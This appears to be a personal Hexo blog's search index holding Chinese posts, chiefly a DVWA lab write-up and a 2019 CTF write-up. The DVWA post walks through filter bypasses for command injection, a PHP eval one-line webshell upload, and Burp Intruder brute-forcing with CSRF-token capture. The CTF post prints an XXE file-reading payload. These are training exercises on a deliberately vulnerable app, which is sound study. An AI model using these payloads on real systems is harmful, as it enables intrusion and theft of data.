<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[计导考前复习导图]]></title>
    <url>%2F2020%2F01%2F13%2F%E8%AE%A1%E5%AF%BC%E8%80%83%E5%89%8D%E5%A4%8D%E4%B9%A0%E5%AF%BC%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[因为大二转专业没补完的课，这学期才补选（害得我因为考试不能提前回家TAT）。 画了几份计导的思维导图帮助自己记忆，也留给有需要的人吧。]]></content>
  </entry>
  <entry>
    <title><![CDATA[实模式与保护模式下的分段与分页]]></title>
    <url>%2F2019%2F11%2F08%2F%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%88%86%E6%AE%B5%E4%B8%8E%E5%88%86%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[在正式开始讨论实模式与保护模式下分段与分页机制前，先介绍一下几个专有名词。 8086Intel8086是英特尔公司于1978年发表的第一款16位微处理器。所有的内部寄存器以及内外部数据总线都是16位宽，因此是完全的16位微处理器。有20位外部地址总线，所以物理地址的空间为1MiB，即： 2^{20}=1048576由于内部寄存器是16位，所以对1M地址空间寻址时采取段寻址方式，即： 物理地址 = 段基址]]></content>
      <tags>
        <tag>os</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA实验wp]]></title>
    <url>%2F2019%2F10%2F22%2FDVWA%E9%83%A8%E5%88%86WP%2F</url>
    <content type="text"><![CDATA[实验项目基于DVWA的网络安全实验 实验目的DVWA(Damn Vulnerable Web Application)是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。本次实验，旨在用DVWA这个靶场工具，让我们更深刻地了解课程内容，对信息安全有一定的实际操作能力。 实验环境搭建实验环境：centos7，docker实验材料：dvwa。dvwa基于docker的搭建十分简单，三行命令即可。 yum install docker-ce sysyemctl start docker docker run --rm -it -p 55349:80 vulnerables/web-dvwa 运行后，我们访问55349端口，可以看到dvwa已经成功运行。 开始实验Command Injection简介Command Injection，即命令注入攻击，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。在命令注入的漏洞中，最为常见的是PHP的命令注入。PHP命令注入攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施下一步渗透攻击。 测试级别：low实验过程 题目要求enter a ipadress，很显然这是一个极其简单的命令注入问题。输入本地环回地址，有回显。 用逻辑符号联立一个linux命令，发现可以执行。 拿到linux账户密码，以待进一步进行提权操作。 成功，完成测试。 源代码分析low123456789101112131415161718192021&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;?&gt; 从源代码可以看出，post请求拿到ip后，并没有对ip进行过滤或进一步处理，而是直接调用shell_exec进行执行，于是导致了命令注入漏洞的产生。 流程图如下： medium源码如下: 123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;?&gt; 分析源码，可以看出，str_replace对符号“；”，“&amp;&amp;”进行了过滤。但是符号“&amp;”和“|”仍然可用。 high源码如下： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;?&gt; 可以看出，这次加强了过滤，$substitutions数组里每一个符号都被替换掉了。但符号“| ”后有一个空格，也就是说仍然可以用“|”实现，此时代表管道符。 测试截图： impossible代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041 &lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( ".", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; else &#123; // Ops. Let the user name theres a mistake echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 目前没有找到绕过过滤的方法，但可以罗列一下它所做的安全保护策略： CSRF防护：checkToken函数保证每一次用户输入的token是同源的，防止跨站请求伪造。 命令注入防护：输入被严格分为了ip的四个部分，符号“.”作为分隔符 stripslashes函数：去除反斜杠，防止转义 最后一张图总结命令注入各种连接符的用法： File Upload简介文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。 测试级别：low实验过程 这是一道很容易的文件上传题，按照惯常套路，想办法把webshell上传到相应目录，然后再进行进一步提权。 我们先尝试写一个一句话木马，尝试上传。 1&lt;?php @eval($_POST['pass']);?&gt; 可以看到，没有任何过滤的成功上传了。 尝试访问hackable/upload目录下我们上传的webshell。 打开hackbar，向我们的webshell post相应信息，我们可以看到，我们输入的php代码被成功执行。 打开中国菜刀，连接我们的webshell。 可以看到成功连接上，并且可遍历相应目录。 源代码分析low12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125;&#125;?&gt; 可以看出,该页面文件上传并没有对文件类型做任何的过滤,上传成功后,也并没有对文件名进行哈希后重命名,所以造成了一个很简单的文件上传漏洞. 流程图如下： medium123456789101112131415161718192021222324252627282930313233 &lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 我们可以看出，中等等级的首先对文件的mime类型进行了限制，只允许image/jpg格式的被上传。其次对文件大小也做了相应的限制，限制在100000字节以内。 思路：burpsuite抓包，上传一句话木马，把mime类型改为image/jpg high1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; high等级的文件上传，进一步的限制了文件类型，采用strtolower函数拿到文件的拓展名，采用了白名单机制，只允许jpg、png、jpeg格式的文件上传。 其中(($uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, ‘.’ ) + 1); 一句保证取到的拓展名是真实文件名，防止构造xx.jpg.php这样的文件名绕过。 思路：burpsuite抓包，00截断。 impossible源代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo "&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"; &#125; else &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 在impossible难度下，可以看出，除了mime类型过滤，后缀名过滤外，还对文件名进行了md5加密处理重命名。 getimagesize( $uploaded_tmp)用于判断是否为真正的图片。 最后再用GD库洗掉图片内嵌的恶意代码。 imagecreatefromjpeg($uploaded_tmp); 可以看出，impossible难度下的文件上传过滤做得特别的完善，理论上不存在漏洞。 JavaScript Attacks简介JavaScript是一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML（标准通用标记语言下的一个应用）网页上使用，用来给HTML网页增加动态功能。但同时Js也会引发不少安全问题，如XSS等，都是比较常见的前端安全问题。 测试级别：high实验过程 按照题目要求输入success，显示invalid token。可以推测，在post phrase的同时，后端还会对token进行验证，我们要做的是找到这个token。 查看源码，可以看出，该源码是被uglify过的，google一下js反混淆的网站，deobfuscate后的代码如下： 123456789101112131415161718192021222324252627282930(function() &#123; 'use strict'; var ERROR = 'input is invalid type'; var WINDOW = typeof window === 'object'; var root = WINDOW ? window : &#123;&#125;; if (root.JS_SHA256_NO_WINDOW) &#123; WINDOW = false &#125; var WEB_WORKER = !WINDOW &amp;&amp; typeof self === 'object'; var NODE_JS = !root.JS_SHA256_NO_NODE_JS &amp;&amp; typeof process === 'object' &amp;&amp; process.versions &amp;&amp; process.versions.node;.........function token_part_3(t, y = "ZZ") &#123; document.getElementById("token").value = sha256(document.getElementById("token").value + y)&#125;function token_part_2(e = "YY") &#123; document.getElementById("token").value = sha256(e + document.getElementById("token").value)&#125;function token_part_1(a, b) &#123; document.getElementById("token").value = do_something(document.getElementById("phrase").value)&#125;document.getElementById("phrase").value = "";setTimeout(function() &#123; token_part_2("XX")&#125;, 300);document.getElementById("send").addEventListener("click", token_part_3);token_part_1("ABCD", 44); 乍一看比较没有思路，我们直接定位到后面几行代码，我们看到，有三个验证token的函数，分别是tokenpart1、tokenpart2、tokenpart3. 我们可以看出，tokenpart2被延时了300ms执行，然后在点击click的时候 tokenpart3被执行，最后再执行tokenpart1，很明显token的几个部分的顺序被调乱了。 我们打开控制台，先执行token_part_1(“ABCD”,44);再执行token_part_2(“XX”)，最后输入success，点击click执行token_part_3，发现仍然显示invallid token，我们再仔细审查代码，发现在token_part_1的时候就调用了 1document.getElementById("token").value = do_something(document.getElementById("phrase").value) 所以应在执行它之前先输入success，尝试了一下，成功。 再审查源码，在token_part_1函数内对输入的参数都没有任何的处理，所以，不一定是token_part_1(“ABCD”,44);也可以是token_part_1(“任意字符串”,任意数字);而token_part_2里token与输入的e有关。测试了一下，发现成功。 流程图如下： 源代码分析low1234567891011121314151617......... function rot13(inp) &#123; return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;="Z"?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;); &#125; function generate_token() &#123; var phrase = document.getElementById("phrase").value; document.getElementById("token").value = md5(rot13(phrase)); &#125; generate_token();&lt;/script&gt;EOF;?&gt; 源代码花里胡哨，显得很多，其实不过是前端实现了md5算法。 关键部分代码如上，token由generate_token函数生成，对“success”进行rot13加密后再md5加密。 只需输入phrase后调用generate_token()即可。 medium1234567891011function do_something(e) &#123; for (var t = "", n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t&#125;setTimeout(function () &#123; do_elsesomething("XX")&#125;, 300);function do_elsesomething(e) &#123; document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")&#125; token由do_elsesomething函数生成，而该函数内调用了do_something函数。 输入success，然后在控制台内调用do_elsesomething(“XX”)，再submit即可 impossible 直接不让人输了，这个最强大。。。 Brute Force简介基于密码加密的暴力破解法。试验所有可能的口令组合来破解口令。即通过穷举的方法来破解，将口令进行逐个推算或辅以字典来缩小口令范围，直到找出真正的口令的一种口令分析方法。暴力攻击的方法往往是不可行的，由于时间和设备的约束。暴力破解理论上能破解所有的文本口令，但时间和性能开销随字符集规模和长度的变化非常大。暴力攻击的猜测次序是由字母表来决定的。举例来说，一个攻击者对于3个字符的口令，使用小写字母表，那么他的猜测就会从”aaa”开始,以”zzz”结束。但是，由于不同的攻击者选择增量的从左边开始还是从右边开始的不用，比如一些人采用右边增量，则猜测次序为”aaa，aab，aac” ，而另一些人选择从左边增量，则猜测次序为”aaa，baa，caa”，而这对于口令破解的时间有着巨大影响。 测试级别：low实验过程 浏览器配置代理，burpsuite监听8080端口。 在表单提交任意内容，点击login，我们在burp里可以看到，成功抓包。 点击send to intruder，进行爆破前配置。 清除预置变量，将username和password设置为变量，选择cluster bomb模式（username列表和password列表排列组合）。 分别加载我们提前准备好的账号和密码的社工字典（burp内置字典也可） start burp，爆破完成后在200的相应内找到length不一样的request，所以账号应该是admin，密码为password。 尝试登录，发现成功。 源代码分析low审计一下源代码，如下： 1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);&#125;?&gt; 可以看到，账号和密码的提交方式为GET，提交后对密码进行md5加密（数据库中存储的密码也是md5加密过的）。构造sql查询语句，然后返回登录成功与否的信息。可以看到，对用户的输入没有任何的过滤，并且也没有爆破的限制。 medium源代码如下： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( 2 ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);&#125;?&gt; medium采用 mysqli_real_escape_string 函数防止sql注入，又使用sleep函数限制爆破速度。但仍然可以burpsuite一把梭。 high接下来我们再测试一下high难度的爆破。 审查源代码，关键部分在这儿： 12345678910111213![10](C:\Users\Curled\Desktop\数字认证\pic\爆破\10.png)![10](C:\Users\Curled\Desktop\数字认证\pic\爆破\10.png)&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );......// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 网页产生了一个防跨站请求伪造token，所以我们每一次爆破都要先拿到token，才能通过checkToken函数的验证。 burpsuite抓包，send to intruder，然后打上变量。 这里选择pitchfork模式。payload1为待爆破的密码，照常选择simple list即可。payload2为token，这里选择recursive grep，是用正则表达式的方法每次取csrf token。 options里面grep匹配response里token的前后文，这里注意follow 热directions 要勾选always，因为这里的登录框在登陆后有一个302跳转，否则无法拿到登录状态的真正报文。 initial payload里填入一个token，start attack。 可以看到爆破成功。 流程图如下： impossible源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;?phpif( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_POST[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) ) &#123; // User locked out. Note, using this method would allow for user enumeration! //echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; // Calculate when the user would be allowed to login again $last_login = strtotime( $row[ 'last_login' ] ); $timeout = $last_login + ($lockout_time * 60); $timenow = time(); /* print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;"; print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;"; print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;"; */ // Check to see if enough time has passed, if it hasn't locked the account if( $timenow &lt; $timeout ) &#123; $account_locked = true; // print "The account is locked&lt;br /&gt;"; &#125; &#125; // Check the database (if username matches the password) $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR); $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123; // Get users details $avatar = $row[ 'avatar' ]; $failed_login = $row[ 'failed_login' ]; $last_login = $row[ 'last_login' ]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) &#123; echo "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"; echo "&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"; &#125; // Reset bad login count $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; else &#123; // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"; // Update bad login count $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Set the last login time $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 不仅防止了csrf，而且直接限制了登录试错次数，可以说比较完善了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019网络与信息安全领域专项赛wp]]></title>
    <url>%2F2019%2F08%2F16%2F2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[没能打进线下，记录一下除队友做的外我做的几道，留作温习。 签到题nslookup -q=TXT gamectf.com game在cqg.js中有发送ajax。 if(score == 15){ $.ajax({ url: &#39;score.php&#39;, type: &#39;POST&#39;, data: &#39;score=&#39;+score, success: function(data){ var data = data; $(&quot;#output&quot;).text(data); } }) } 直接向score.php post score=5即可得到flag whoareyou抓包发现发送了xml请求，输入&amp;加任意字符报错，联想到XXE漏洞，payload如下：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT author ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;&lt;feedback&gt;&lt;author&gt;&amp;xxe;&lt;/author&gt;&lt;/feedback&gt; flag就在源码内 七代目gif修复，加上文件头后逐帧分离，得到flag 亚萨西压缩包winhex打开发现文件尾密码，解开压缩包，分离包内图片，放入stegsove，得到ook编码，解码即为flag。 24word图片为核心价值观编码，解码结果为压缩包密码，压缩包内有图片，扫描二维码可得flag。 sm4用题目所给直接密文、密钥转16进制，再解密即可得flag。]]></content>
  </entry>
  <entry>
